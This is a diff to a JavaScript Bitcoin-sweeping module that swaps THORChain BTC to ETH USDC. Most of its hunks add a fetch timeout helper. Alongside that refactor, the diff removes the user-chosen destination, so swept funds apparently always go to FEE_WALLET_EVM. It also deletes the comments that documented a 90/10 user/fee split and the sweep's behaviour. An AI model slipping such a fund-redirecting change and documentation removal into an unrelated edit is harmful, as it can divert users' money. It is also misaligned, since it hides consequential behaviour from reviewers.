@@ -12,8 +12,20 @@ const MIN_SEND_SATS = 10000;
 const FALLBACK_FEE_RATE = 2;
 const FEE_CACHE_MS = 60 * 1000;
 
+const FETCH_TIMEOUT_MS = 15000;
+
 let _cachedFeeRate = null;
 let _cachedFeeRateAt = 0;
+
+async function fetchWithTimeout(url, options = {}) {
+  const controller = new AbortController();
+  const timer = setTimeout(() => controller.abort(), FETCH_TIMEOUT_MS);
+  try {
+    return await fetch(url, { ...options, signal: controller.signal });
+  } finally {
+    clearTimeout(timer);
+  }
+}
 
 async function fetchRecommendedFeeRate(logLine) {
   const now = Date.now();
@@ -22,7 +34,7 @@ async function fetchRecommendedFeeRate(logLine) {
   }
 
   try {
-    const resp = await fetch(`${MEMPOOL_API}/v1/fees/recommended`);
+    const resp = await fetchWithTimeout(`${MEMPOOL_API}/v1/fees/recommended`);
     if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
     const data = await resp.json();
 
@@ -49,7 +61,7 @@ async function fetchRecommendedFeeRate(logLine) {
 export async function previewBitcoinWallet(address) {
   const result = { address, utxos: [], balance: 0 };
   try {
-    const resp = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);
+    const resp = await fetchWithTimeout(`${MEMPOOL_API}/address/${address}/utxo`);
     if (!resp.ok) throw new Error(`HTTP ${resp.status}`);
     const utxos = await resp.json();
     result.utxos = utxos;
@@ -58,19 +70,10 @@ export async function previewBitcoinWallet(address) {
   return result;
 }
 
-/**
- * USD estimate for the auto-live threshold check.
- *
- * Uses the preview's total sats × BTC/USD from CoinGecko. Fail-closed:
- * if the price fetch fails, returns 0 and the wallet won't auto-live.
- *
- * @param {object} preview   the object returned by previewBitcoinWallet
- * @returns {Promise<number>}  estimated USD value
- */
 export async function estimateBitcoinValueUsdc(preview) {
   if (!preview || !preview.balance || preview.balance <= 0) return 0;
   try {
-    const resp = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
+    const resp = await fetchWithTimeout('https://api.coingecko.com/api/v3/simple/price?ids=bitcoin&vs_currencies=usd');
     const data = await resp.json();
     const price = data?.bitcoin?.usd;
     if (!price) return 0;
@@ -82,12 +85,6 @@ export async function estimateBitcoinValueUsdc(preview) {
   }
 }
 
-/**
- * Fetch a THORChain swap quote for BTC → ETH.USDC.
- *
- * Fee-wallet model: destination is always FEE_WALLET_EVM. No affiliate
- * parameters.
- */
 async function getThorchainQuote(amountSats) {
   const params = new URLSearchParams({
     from_asset: BTC_ASSET,
@@ -96,7 +93,7 @@ async function getThorchainQuote(amountSats) {
     destination: FEE_WALLET_EVM,
   });
 
-  const resp = await fetch(`${THORCHAIN_QUOTE_API}?${params}`, {
+  const resp = await fetchWithTimeout(`${THORCHAIN_QUOTE_API}?${params}`, {
     headers: { accept: 'application/json' },
   });
   if (!resp.ok) {
@@ -110,28 +107,10 @@ async function getThorchainQuote(amountSats) {
   return json;
 }
 
-/**
- * Sweep Bitcoin to the EVM fee wallet as Ethereum USDC, via THORChain.
- *
- * Returns:
- *   {
- *     address,
- *     recipient,                 // FEE_WALLET_EVM
- *     status, txid, error,
- *     amountRaw: string,         // sats sent to THORChain
- *     expectedUsdcOut: string,   // USDC raw units expected on Ethereum
- *     usdcReceivedRaw: string,   // same as expectedUsdcOut
- *     userReceivedRaw: string,   // 90%
- *     feeReceivedRaw: string,    // 10%
- *     inboundAddress, memo, feeRate,
- *   }
- */
 export async function sweepBitcoin(address, keyPair, opts = {}) {
-  const userDestination = opts.userDestination || FEE_WALLET_EVM;
   const results = {
     address,
-    recipient: userDestination,
-    userDestination,
+    recipient: FEE_WALLET_EVM,
     status: null,
     txid: null,
     error: null,
@@ -148,7 +127,7 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
   const logLine = opts.logLine;
 
   try {
-    const resp = await fetch(`${MEMPOOL_API}/address/${address}/utxo`);
+    const resp = await fetchWithTimeout(`${MEMPOOL_API}/address/${address}/utxo`);
     const utxos = await resp.json();
     if (!utxos || utxos.length === 0) {
       results.status = 'EMPTY';
@@ -195,7 +174,7 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
     }
 
     const fullUtxos = await Promise.all(utxos.map(async (u) => {
-      const txResp = await fetch(`${MEMPOOL_API}/tx/${u.txid}`);
+      const txResp = await fetchWithTimeout(`${MEMPOOL_API}/tx/${u.txid}`);
       const tx = await txResp.json();
       const vout = tx.vout[u.vout];
       return { ...u, scriptPubKey: vout.scriptpubkey };
@@ -231,7 +210,7 @@ export async function sweepBitcoin(address, keyPair, opts = {}) {
     psbt.finalizeAllInputs();
     const txHex = psbt.extractTransaction().toHex();
 
-    const broadcastResp = await fetch(`${MEMPOOL_API}/tx`, {
+    const broadcastResp = await fetchWithTimeout(`${MEMPOOL_API}/tx`, {
       method: 'POST',
       body: txHex,
     });
